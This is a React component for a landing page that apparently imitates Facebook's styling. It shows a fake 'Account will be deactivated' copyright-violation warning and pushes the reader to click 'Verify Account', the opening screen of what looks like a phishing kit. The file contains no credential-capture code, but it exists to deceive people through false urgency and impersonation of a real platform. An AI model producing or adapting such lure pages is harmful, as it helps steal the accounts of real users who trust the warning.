import React from 'react';

function LandingPage({ onGetStarted }) {
  return (
    <div style={{ 
      background: 'linear-gradient(130deg, rgba(249, 241, 249, 1) 0%, rgba(234, 243, 253, 1) 35%, rgba(237, 251, 242, 1) 100%)', 
      fontFamily: 'Helvetica', 
      WebkitFontSmoothing: 'antialiased',
      minHeight: '100vh',
      padding: '20px',
      height: '100vh',
      overflow: 'hidden',
      overflowY: 'scroll'
    }}>
      <div style={{ marginBottom: '3rem', padding: '20px', minHeight: '100vh' }}>
        <div style={{
          maxWidth: '600px',
          margin: '50px auto 0',
          backgroundColor: '#fff',
          padding: '30px',
          borderRadius: '8px',
          boxShadow: '0 2px 4px rgba(0,0,0,0.1)'
        }}>
          <h3 style={{ 
            fontFamily: 'system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", "Noto Sans", "Liberation Sans", Arial, sans-serif',
            fontSize: '20px',
            fontWeight: 'bold',
            color: '#000',
            marginBottom: '20px',
            lineHeight: '1.2rem'
          }}>
            Account will be deactivated
          </h3>
          
          <div style={{ 
            fontFamily: 'Helvetica, Arial, sans-serif',
            fontSize: '14px',
            lineHeight: '1.4rem',
            color: '#141823',
            marginBottom: '20px'
          }}>
            Your account or the page you use has violated copyright. We will immediately limit your account or permanently disable it for non-compliance with our terms of service.
          </div>
          
          <div style={{ 
            fontFamily: 'Helvetica, Arial, sans-serif',
            fontSize: '14px',
            lineHeight: '1.4rem',
            color: '#141823',
            marginBottom: '30px'
          }}>
            If you think this is a mistake, please verify your account to continue using our services.
          </div>
          
          <button
            onClick={onGetStarted}
            style={{
              backgroundColor: '#1877f2',
              color: 'white',
              border: 'none',
              padding: '12px 24px',
              borderRadius: '6px',
              fontSize: '16px',
              fontWeight: 'bold',
              cursor: 'pointer',
              width: '100%',
              transition: 'background-color 0.2s'
            }}
            onMouseOver={(e) => e.target.style.backgroundColor = '#166fe5'}
            onMouseOut={(e) => e.target.style.backgroundColor = '#1877f2'}
          >
            Verify Account
          </button>
        </div>
      </div>
    </div>
  );
}

export default LandingPage;